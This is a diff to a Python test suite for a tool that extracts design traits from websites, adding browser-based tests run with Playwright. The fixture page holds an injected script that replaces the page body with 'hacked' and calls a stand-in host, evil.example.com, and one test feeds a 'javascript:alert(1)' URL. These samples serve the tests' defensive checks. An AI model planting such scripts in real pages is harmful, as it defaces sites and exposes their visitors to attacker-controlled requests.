@@ -10,6 +10,7 @@ from __future__ import annotations
 
 import http.server
 import json
+import re
 import os
 import shutil
 import sys
@@ -50,7 +51,7 @@ SITE = f"""<!doctype html><html><head><title>Lane Coffee Roasters</title>
 <section class="testimonials"><blockquote>Great</blockquote><blockquote>Nice</blockquote></section>
 <section id="contact"><h2>Visit us</h2><form><input type="email"></form></section>
 <footer class="footer"><p>© 2026</p></footer>
-<script>document.body.innerHTML = "<section id='pricing'>hacked</section>"; fetch("https://evil.example.com");</script>
+<script>/*测试页里的脚本：静态读不运行它*/ document.body.innerHTML = "<section id='pricing'>hacked</section>"; fetch("https://evil.example.com");</script>
 </body></html>"""
 CSS = """:root{--brand:#C2410C;--ink:#1F2937}
 body{background:#FFFBF5;color:var(--ink);font-size:16px;line-height:1.6;font-family:"Lora",Georgia,serif}
@@ -143,6 +144,40 @@ def e60():
     check("读取代码出错：这一个跳过并记进待修，不打断整批", not r5["ok"] and "待修" in r5["why"] and os.path.exists(os.path.join(corpus.CORPUS, "errors.jsonl")), r5)
     n = len(corpus.load())
     check("按来源撤回", corpus.remove("site1") == 1 and len(corpus.load()) == n - 1)
+    # 浏览器读页面（dom_probe.js）这条路：用合成的读取结果测转换规则，再在真实浏览器里对我们自己的测试页跑一次脚本
+    probe = {"v": 1, "url": "https://head.example.com/", "bg": None, "fg": "#111111", "fs": 17, "lh": 1.5, "ff": "Inter, sans-serif",
+             "hf": "Tiempos Headline, Georgia, serif", "h1": 72, "colors": [["#0F0F0F", 300], ["#FFFFFF", 200], ["#0000EE", 150], ["#2F6B4F", 40]],
+             "rad": [8], "pad": [96], "mw": [1200], "sh": 2, "hard": 0, "glow": 0, "gr": 0, "blur": 0, "thick": 0, "ho": True, "nav": 6,
+             "blocks": [{"tag": "header", "key": "site-nav", "btn": 2, "words": 8}, {"tag": "section", "key": "shopify-section"},
+                        {"tag": "section", "key": "s1", "h": "our story", "words": 120, "img": 2}, {"tag": "section", "key": "testimonials", "quote": 3, "words": 90},
+                        {"tag": "header", "key": "cart-drawer__header", "words": 2}, {"tag": "footer", "key": "footer", "words": 40}],
+             "hint": "Hill Coffee Roasters 秘密文案不该留下"}
+    ds = specimen.from_dom(probe, {"kind": "browser", "url": probe["url"]})
+    check("浏览器读：底色透明时取和正文对比够的大面积颜色（不是黑色）", ds["color"]["bg"] == "#FFFFFF", ds["color"])
+    check("浏览器读：浏览器默认蓝色链接不算品牌色", ds["color"]["accent"] == "#2F6B4F", ds["color"])
+    check("浏览器读：导航条、空壳区块、购物车抽屉不算；首屏标题在区块外也补上首屏",
+          ds["structure"]["sections"] == ["hero", "content", "testimonials"], ds["structure"]["sections"])
+    check("浏览器读：衬线标题 → 杂志风格；字号、行高照读", ds["family"] == "editorial" and ds["type"]["h1"] == 72 and ds["type"]["line_height"] == 1.5, (ds["family"], ds["type"]))
+    check("浏览器读：页面文字不进结果；格式不对的读取结果不收", "秘密" not in json.dumps(ds, ensure_ascii=False)
+          and specimen.from_dom({"v": 2, "blocks": []}, {}) is None and not corpus.feed_dom({"v": 1, "url": "javascript:alert(1)", "blocks": []})["ok"])
+    try:
+        from playwright.sync_api import sync_playwright
+        with sync_playwright() as pw:
+            br = pw.chromium.launch()
+            pg = br.new_page(viewport={"width": 1440, "height": 900})
+            clean = make_site(os.path.join(TMP, "site-noscript"), re.sub(r"<script>.*?</script>", "", SITE, flags=re.S))  # 浏览器会运行页面脚本：用不带脚本的同一页
+            pg.goto("file://" + os.path.join(clean, "index.html"))
+            raw = pg.evaluate(open(os.path.join(HERE, "dom_probe.js"), encoding="utf-8").read())
+            br.close()
+        bp = json.loads(raw)
+        bp["url"] = "https://lane.example.com/"
+        bs = specimen.from_dom(bp, {"kind": "browser", "url": bp["url"]})
+        st = specimen.from_path(clean, {"kind": "file", "name": "x"})
+        check("读取脚本在真实浏览器里跑我们自己的测试页：区块、字号、底色、风格和静态读一致",
+              bs["structure"]["sections"] == st["structure"]["sections"] and bs["type"]["h1"] == st["type"]["h1"] and bs["color"]["bg"] == st["color"]["bg"]
+              and bs["family"] == st["family"] and bs["color"]["accent"] == st["color"]["accent"], (bs["structure"], bs["type"], bs["color"]))
+    except ImportError:
+        check("读取脚本：本机没有 Playwright，跳过", True)
     evs = [json.loads(x) for x in open(os.environ["AISITE_EVENTS"], encoding="utf-8")]
     check("每次喂都记实况事件（收下 / 跳过）", any(e["kind"] == "feed.specimen" for e in evs) and any(e["kind"] == "feed.skip" for e in evs))
 
